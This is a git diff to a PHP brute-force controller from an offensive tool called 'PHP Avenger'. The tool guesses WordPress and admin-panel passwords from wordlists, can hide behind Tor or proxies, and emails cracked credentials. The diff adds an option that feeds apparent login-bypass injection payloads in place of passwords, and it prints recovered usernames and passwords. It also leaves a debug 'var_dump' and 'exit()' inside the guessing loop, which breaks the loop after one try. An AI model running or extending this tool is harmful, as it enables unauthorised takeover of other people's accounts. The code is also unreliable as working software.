@@ -63,6 +63,11 @@ class BruteForceController extends Command{
                         null,
                         InputOption::VALUE_NONE,
                         'Set the email for send result. Example: --email'),
+                    new InputOption(
+                        'injection',
+                        null,
+                        InputOption::VALUE_NONE,
+                        'Set the email for send result. Example: --injection'),
                    	
                     /*new InputOption(
                     	'hashs',
@@ -117,6 +122,12 @@ class BruteForceController extends Command{
         $tor          = $input->getOption('tor');
         $optionMail   = $input->getOption('email');
         $ProxySiteList= $input->getOption('proxySiteList');
+        $injection      = $input->getOption('injection');
+
+        if($injection)
+        {
+            $output->writeln("<danger>Injection is not effective in brute force in WordPress...</danger>");
+        }
 
         //verify if target is list or one
         $targets=$this->getTargetsInArray($target);
@@ -162,7 +173,6 @@ class BruteForceController extends Command{
 
                 //VALIDATEE IF IS WORDPRESS AND EXIST USERNAMES
                 if($isWordPress && $usernames!=false && array_search($baseUrlWordPress,$oldTargets)==false){
-
                     foreach($usernames as $username){
                         $output->writeln("<info>Search password of ".$username."</info>");
                         foreach ($wordlist as $keyWordList => $valueWordList) {
@@ -193,7 +203,7 @@ class BruteForceController extends Command{
 
                                 $msg = "PHP Avenger Informer, SUCCESS:<br><br>";
                                 $msg.= "Target =".$valueTarget."<br>";
-                                $msg.= "Username =".$valueTarget."<br>";
+                                $msg.= "Username =".$username."<br>";
                                 $msg.= "Password =".$valueWordList."<br>";
                                 if($optionMail){
                                     $mailer = new Mailer();
@@ -202,6 +212,8 @@ class BruteForceController extends Command{
 
                                 break;
                             }
+                            var_dump($returnHtml);
+                            exit();
 
                         }
                     }
@@ -239,8 +251,10 @@ class BruteForceController extends Command{
         return array();
 
     }
+
     protected function executeBruteForceAll(InputInterface $input, OutputInterface $output)
     {
+
         //$wordlistClass = new Wordlist();
         //$dataBruteForceWordPress = new \StdClass;
         $target      = $input->getArgument('target');
@@ -249,17 +263,15 @@ class BruteForceController extends Command{
         $tor         = $input->getOption('tor');
         $email       = $input->getOption('email');
         $ProxySiteList= $input->getOption('proxySiteList');
+        $injection   = $input->getOption('injection');
 
         //Return $proxy if it exist
         $proxy=$this->getProxy($tor,$ProxySiteList);
+
         //verify if target is list or one
         $targets=$this->getTargetsInArray($target);
-
-        //verify is wordlist and set wordlist default
-        $wordlist=$this->getWordListInArray($wordlist);
-
-
-        if($targets!=false && $wordlist!=false)
+        $oldTargets=[];
+        if($targets!=false )
         {
 
             //CONFIG PROFRESSBAR
@@ -273,6 +285,16 @@ class BruteForceController extends Command{
 
                 $site = new Site($valueTarget,$proxy);
 
+                //verify is wordlist and set wordlist default
+                //RETURN BASENAME OF TARGET
+                $baseUrl=$site->getBaseUrByUrl();
+
+                if($injection)
+                {
+                    $wordlist=$site->listOfInjectionAdmin();
+                }
+
+                $wordlist=$site->getWordListInArray($wordlist);
 
                 //$resultIsJoomla=$site->isJoomla();
                 $resultIsAdmin=$site->isAdmin();
@@ -286,7 +308,9 @@ class BruteForceController extends Command{
 
                     $excludeValues[]=$usernameField;
                     $excludeValues[]=$passwordField;
+
                     $otherFields=$site->getOthersField(array_merge($usernameField,$passwordField));
+
                     if(!isset($otherFields[$actionForm]))
                     {
                         $otherFields[$actionForm]=array();
@@ -295,9 +319,16 @@ class BruteForceController extends Command{
 
                     if($resultOfBruteForce)
                     {
+                        $output->writeln("");
+                        $output->writeln("<info>Login success</info>");
+                        $output->writeln("<info>Target: ".$valueTarget."</info>");
+                        $output->writeln("<info>Username: ".$resultOfBruteForce['username']."</info>");
+                        $output->writeln("<info>Password: ".$resultOfBruteForce['password']."</info>");
+
                         $resultFinal[0]['target']=$valueTarget;
                         $resultFinal[0]['username']=$resultOfBruteForce['username'];
                         $resultFinal[0]['password']=$resultOfBruteForce['password'];
+                        var_dump($resultFinal);
                         if(isset($resultOfBruteForce['obs']))
                         {
                             $resultFinal[0]['obs']=$resultOfBruteForce['obs'];
@@ -310,8 +341,9 @@ class BruteForceController extends Command{
                     //
                     //$methodForm     = $site->getMethodForm();
                 }else{
-                    echo "não é admin";
+                    echo "is not admin";
                 }
+                $oldTargets[]=$baseUrl;
             }
         }
     }
